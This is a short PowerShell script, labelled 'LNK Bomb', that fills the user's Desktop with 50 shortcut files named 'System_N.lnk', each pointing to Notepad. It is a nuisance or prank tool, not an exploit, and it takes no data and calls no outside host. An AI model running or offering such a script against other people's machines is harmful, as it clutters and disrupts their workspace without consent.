# LNK Bomb - Generates spam shortcut files on Desktop
$dest = "$env:USERPROFILE\\Desktop"
1..50 | ForEach-Object {
  $link = "$dest\\System_$_" + ".lnk"
  $ws = New-Object -ComObject WScript.Shell
  $s = $ws.CreateShortcut($link)
  $s.TargetPath = "C:\\Windows\\System32\\notepad.exe"
  $s.Save()
}
